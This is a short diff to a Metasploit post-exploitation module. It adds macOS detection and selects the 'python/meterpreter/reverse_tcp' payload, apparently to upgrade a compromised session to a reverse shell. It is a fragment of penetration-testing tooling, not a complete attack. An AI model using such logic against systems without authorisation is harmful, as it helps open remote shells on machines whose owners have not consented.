@@ -101,7 +101,11 @@ class Metasploit3 < Msf::Post
         lplat = [Msf::Platform::Linux]
         larch = [ARCH_X86]
         vprint_status("Platform: Linux")
-      elsif cmd_exec('python -V') =~ /Python (2|3)\.(\d)/
+      elsif target_info =~ /darwin/i
+        platform = 'python'
+        payload_name = 'python/meterpreter/reverse_tcp'
+        vprint_status("Platform: OS X")
+      elsif cmd_exec('python -V 2>&1') =~ /Python (2|3)\.(\d)/
         # Generic fallback for OSX, Solaris, Linux/ARM
         platform = 'python'
         payload_name = 'python/meterpreter/reverse_tcp'
